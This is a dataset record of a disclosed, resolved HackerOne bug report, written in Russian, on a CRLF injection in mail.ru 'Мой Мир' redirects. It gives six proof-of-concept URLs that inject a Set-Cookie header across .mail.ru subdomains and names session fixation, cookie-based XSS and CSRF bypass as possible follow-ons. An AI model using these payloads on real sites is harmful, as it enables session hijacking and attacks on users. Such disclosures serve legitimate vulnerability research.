---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '67386'
original_report_id: '67386'
title: '[my.mail.ru] CRLF Injection'
team_handle: mailru
created_at: '2015-06-11T08:52:40.762Z'
disclosed_at: '2016-10-03T11:56:54.964Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 7
tags:
- hackerone
---

# [my.mail.ru] CRLF Injection

## Metadata

- HackerOne Report ID: 67386
- Weakness: 
- Program: mailru
- Disclosed At: 2016-10-03T11:56:54.964Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Сценарий перенаправления с /folder/ на /folder уязвим к атаке типа CRLF Injection.

PoC 
Установка cookie crlf=inj на .mail.ru
Подвержены все браузеры, кроме FireFox
```
http://my.mail.ru/crlftest%0dSet-Cookie:crlf=inj6;domain=.mail.ru;path=/;/
http://m.my.mail.ru/crlftest%0dSet-Cookie:crlf=inj4;domain=.mail.ru;path=/;/
https://mir.mail.ru/crlftest%0dSet-Cookie:crlf=inj3;domain=.mail.ru;path=/;/
https://blog.mail.ru/crlftest%0dSet-Cookie:crlf=inj5;domain=.mail.ru;path=/;/
https://blogs.mail.ru/crlftest%0dSet-Cookie:crlf=inj7;domain=.mail.ru;path=/;/
https://www.video.mail.ru/crlftest%0dSet-Cookie:crlf=inj2;domain=.mail.ru;path=/;/
```
Может быть использовано в комбинации с другими уязвимостями (в случае их наличия) / факторами, например:
1) XSS через Cookie
2) Фиксация сессии
2) Обход CSRF защиты, основанной на Cookie

PS: решил отправить все вместе, так как баги одинаковые и все относятся к "Мой Мир"

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
